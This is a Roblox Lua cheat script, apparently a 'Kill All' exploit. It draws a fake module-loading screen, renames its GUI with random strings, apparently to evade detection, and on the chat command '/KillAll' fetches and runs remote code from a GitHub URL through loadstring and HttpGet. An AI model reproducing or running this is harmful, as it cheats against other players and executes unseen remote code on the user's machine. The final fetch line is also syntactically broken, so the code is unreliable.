local KILL_ALL_sL2 = Instance.new("ScreenGui")
local MAIN = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local ScrollBackground = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local DOING_WHAT = Instance.new("TextButton")
local Shadow = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_4 = Instance.new("UICorner")
local SelectedName = Instance.new("Frame")
local MODULES = Instance.new("TextLabel")
local Main2 = Instance.new("TextLabel")
local HOW_MUCH = Instance.new("TextLabel")
local WHO = Instance.new("TextLabel")

--Properties:

KILL_ALL_sL2.Name = "KILL_ALL_sL2"
KILL_ALL_sL2.Parent = game.CoreGui
KILL_ALL_sL2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MAIN.Name = "MAIN"
MAIN.Parent = KILL_ALL_sL2
MAIN.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
MAIN.Position = UDim2.new(0.103021361, 0, 0.0651542321, 0)
MAIN.Size = UDim2.new(0, 680, 0, 309)

UICorner.Parent = MAIN

ScrollBackground.Name = "ScrollBackground"
ScrollBackground.Parent = MAIN
ScrollBackground.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
ScrollBackground.Position = UDim2.new(0.0332910419, 0, 0.259319752, 0)
ScrollBackground.Size = UDim2.new(0, 637, 0, 204)

UICorner_2.Parent = ScrollBackground

DOING_WHAT.Name = "DOING_WHAT"
DOING_WHAT.Parent = MAIN
DOING_WHAT.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
DOING_WHAT.BorderSizePixel = 0
DOING_WHAT.Position = UDim2.new(0.321038693, 0, 0.0410958678, 0)
DOING_WHAT.Size = UDim2.new(0, 242, 0, 45)
DOING_WHAT.ZIndex = 2
DOING_WHAT.Font = Enum.Font.GothamMedium
DOING_WHAT.Text = ""
DOING_WHAT.TextColor3 = Color3.fromRGB(255, 255, 255)
DOING_WHAT.TextScaled = true
DOING_WHAT.TextSize = 14.000
DOING_WHAT.TextWrapped = true

Shadow.Name = "Shadow"
Shadow.Parent = DOING_WHAT
Shadow.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Shadow.BorderSizePixel = 0
Shadow.Size = UDim2.new(1, 0, 1, 4)

UICorner_3.Parent = Shadow

TextLabel.Parent = DOING_WHAT
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.516528964, 0, 0.544444442, 0)
TextLabel.Size = UDim2.new(1, -20, 1, -20)
TextLabel.ZIndex = 2
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.Text = "STATUS: CACHING MODULES"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

UICorner_4.Parent = DOING_WHAT

SelectedName.Name = "SelectedName"
SelectedName.Parent = MAIN
SelectedName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SelectedName.BackgroundTransparency = 1.000
SelectedName.BorderSizePixel = 0
SelectedName.Position = UDim2.new(1.13370466, 0, 0.120805368, 0)
SelectedName.Size = UDim2.new(0, 221, 0, 50)

MODULES.Name = "MODULES"
MODULES.Parent = SelectedName
MODULES.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MODULES.BackgroundTransparency = 1.000
MODULES.BorderSizePixel = 0
MODULES.Position = UDim2.new(-2.43891358, 0, 1.08000016, 0)
MODULES.Size = UDim2.new(0, 224, 0, 33)
MODULES.Font = Enum.Font.Gotham
MODULES.Text = "Requiring: GrabProxy"
MODULES.TextColor3 = Color3.fromRGB(255, 255, 255)
MODULES.TextScaled = true
MODULES.TextSize = 23.000
MODULES.TextWrapped = true
MODULES.TextXAlignment = Enum.TextXAlignment.Left

Main2.Name = "Main2"
Main2.Parent = SelectedName
Main2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main2.BackgroundTransparency = 1.000
Main2.BorderSizePixel = 0
Main2.Position = UDim2.new(3.85972881, 0, -0.360000014, 0)
Main2.Size = UDim2.new(0, 163, 0, 33)
Main2.Font = Enum.Font.Gotham
Main2.Text = "Selected: John"
Main2.TextColor3 = Color3.fromRGB(255, 255, 255)
Main2.TextSize = 23.000
Main2.TextXAlignment = Enum.TextXAlignment.Left

HOW_MUCH.Name = "HOW_MUCH"
HOW_MUCH.Parent = SelectedName
HOW_MUCH.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HOW_MUCH.BackgroundTransparency = 1.000
HOW_MUCH.BorderSizePixel = 0
HOW_MUCH.Position = UDim2.new(-2.23981833, 0, 1.74000001, 0)
HOW_MUCH.Size = UDim2.new(0, 136, 0, 29)
HOW_MUCH.Font = Enum.Font.Gotham
HOW_MUCH.Text = "1/10 MODULES"
HOW_MUCH.TextColor3 = Color3.fromRGB(255, 255, 255)
HOW_MUCH.TextScaled = true
HOW_MUCH.TextSize = 15.000
HOW_MUCH.TextWrapped = true

WHO.Name = "WHO"
WHO.Parent = SelectedName
WHO.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WHO.BackgroundTransparency = 1.000
WHO.BorderSizePixel = 0
WHO.Position = UDim2.new(-2.33484125, 0, 2.31999993, 0)
WHO.Size = UDim2.new(0, 178, 0, 29)
WHO.Font = Enum.Font.Gotham
WHO.Text = "Vxr_r"
WHO.TextColor3 = Color3.fromRGB(255, 255, 255)
WHO.TextScaled = true
WHO.TextSize = 17.000
WHO.TextWrapped = true

-- Scripts:

local function YGUXLYF_fake_script() -- KILL_ALL_sL2.Handler 
	local script = Instance.new('LocalScript', KILL_ALL_sL2)

	local SelectLabel = script.Parent.MAIN.SelectedName;
    SelectLabel.WHO:Destroy()

	SelectLabel.MODULES.RichText = true
	SelectLabel.HOW_MUCH.RichText = true
	
	SelectLabel.MODULES.Text = "REQUIRING: <b>GrabProxy</b>"
	SelectLabel.HOW_MUCH.Text = "<b> 1/10 </b> MODULES"
	
	task.wait(10);
	
	SelectLabel.MODULES.Text = "REQUIRING: <b>CAR_MAIN</b>"
	SelectLabel.HOW_MUCH.Text = "<b> 4/10 </b> MODULES"
	
	task.wait(6);
	
	SelectLabel.MODULES.Text = "REQUIRING: <b>RAGDOLLER</b>"
	SelectLabel.HOW_MUCH.Text = "<b> 7/10 </b> MODULES"
	
	task.wait(10.5);
	
	SelectLabel.MODULES.Text = "REQUIRING: <b>Kill_System</b>"
	SelectLabel.HOW_MUCH.Text = "<b> 10/10 </b>MODULES"
	
	task.wait(5.5);
	script.Parent.MAIN.DOING_WHAT.TextLabel.Text = "CACHED - TYPE '/KillAll' TO ACTIVATE"
	
	task.wait(5.5);
	
	script.Parent:Destroy();
end
coroutine.wrap(YGUXLYF_fake_script)()
local function IRMPG_fake_script()
	local script = Instance.new('LocalScript')

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = game.CoreGui["KILL_ALL_sL2"].MAIN
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (15);
	
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	local function generateSecureString(length)
		local charset = {}
		for i = 48, 57 do
			table.insert(charset, string.char(i))
		end
		for i = 65, 90 do
			table.insert(charset, string.char(i))
		end
		for i = 97, 122 do
			table.insert(charset, string.char(i))
		end
		local secureString = ""
		for i = 1, length do
			local randIndex = math.random(1, #charset)
			secureString = secureString .. charset[randIndex]
		end
		return secureString
	end
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
	
	game.CoreGui["KILL_ALL_sL2"].Name = generateSecureString(32);
	game.CoreGui["KILL_ALL_sL2"].Handler.Name = generateSecureString(32);
end
coroutine.wrap(IRMPG_fake_script)();

game.Players.LocalPlayer.Chatted:Connect(function(Chat)
     if Chat == "/KillAll" then
	  loadstring(HttpGet("https://github.com/skidthekid/database/edit/main/SETTINGS.lua")() 	
  end
end)
